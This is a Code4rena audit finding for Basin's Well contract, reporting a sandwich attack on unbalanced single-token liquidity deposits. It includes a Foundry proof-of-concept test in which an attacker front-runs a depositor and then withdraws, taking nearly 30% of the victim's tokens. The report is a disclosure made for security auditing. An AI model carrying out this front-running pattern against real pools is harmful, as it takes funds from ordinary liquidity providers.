## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- sponsor disputed
- edited-by-warden
- M-11

# [addLiquidity Sandwich Attack for unbalanced token deposits](https://github.com/code-423n4/2023-07-basin-findings/issues/82) 

# Lines of code

https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/Well.sol#L392-L399
https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/Well.sol#L495-L517


# Vulnerability details

## Impact
Wells supports adding and removing liquidity in imbalanced proportions. If a user wants to deposit liquidity in an imbalanced ratio (only one token). A attacker can front run the user by doing the same and removing the liquidity directly after the deposit of the user. By doing so the attacker steals a significant percentage of the users funds. This bug points to a mathematical issue whose effects could be even greater.

## Proof of Concept
The following code demonstrates the described vulnerability:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {TestHelper, Balances} from "test/TestHelper.sol";

contract Exploits is TestHelper {
    function setUp() public {
        setupWell(2); // Setup Well with two tokens and a balanced token ratio
    }

    function test_add_liquidity_sandwich_attack() public {
        // init attacker and liquidityProvider, gives them some tokens and saves there balances before the attack
        address liquidityProvider = vm.addr(1);
        address attacker = vm.addr(2);
        mintTokens(liquidityProvider, uint256(100 * 1e18));
        mintTokens(attacker, uint256(1000 * 1e18));
        Balances memory liquidityProviderBalanceBefore = getBalances(address(liquidityProvider), well);
        Balances memory attackerBalanceBefore = getBalances(address(attacker), well);

        // liquidityProvider wants to provide liquidity for only one token / not in current token ratio

        // attacker front runs liquidityProvider and add liquidity for token[0] before liquidityProvider
        vm.startPrank(attacker);
        tokens[0].approve(address(well), 1000 * 1e18);
        uint256[] memory amounts1 = new uint256[](2);
        amounts1[0] = 1000 * 1e18; // 10x the tokens of the liquidityProvider to steal more funds
        amounts1[1] = 0;
        well.addLiquidity(amounts1, 0, attacker, type(uint256).max); 
        vm.stopPrank();

        // liquidityProvider deposits some token[0] tokens
        vm.startPrank(liquidityProvider);
        tokens[0].approve(address(well), 100 * 1e18);
        uint256[] memory amounts2 = new uint256[](2);
        amounts2[0] = 100 * 1e18;
        amounts2[1] = 0;
        well.addLiquidity(amounts2, 0, liquidityProvider, type(uint256).max); 
        vm.stopPrank();

        // attacker burns the LP tokens directly after the deposit of the liquidity provider
        vm.startPrank(attacker);
        Balances memory attackerBalanceBetween = getBalances(address(attacker), well);
        well.removeLiquidityOneToken(
            attackerBalanceBetween.lp,
            tokens[0],
            1,
            address(attacker),
            type(uint256).max
        );
        vm.stopPrank();
        Balances memory attackerBalanceAfter = getBalances(address(attacker), well);
        
        // the attacker got nearly 30% of the liquidityProviders token by front running
        // the percentage value can be increased even further by increasing the amount of tokens the attacker deposits
        // and/or decreasing the amount of tokens the liquidityProvider deposits
        assertTrue(attackerBalanceAfter.tokens[0] - attackerBalanceBefore.tokens[0] > liquidityProviderBalanceBefore.tokens[0] * 28 / 100);
    }
}
```

The test above can be implemented in the Basin test suite and is executable with the following command:

```solidity
forge test --match-test test_add_liquidity_sandwich_attack
```

## Tools Used
Manual Review, Foundry, VSCode

## Recommended Mitigation Steps
Investigating the math behind this function further and writing tests for this edge case is necessary. A potential fix could be forcing users to provide liquidity in the current ratio of the reserves.





## Assessed type

MEV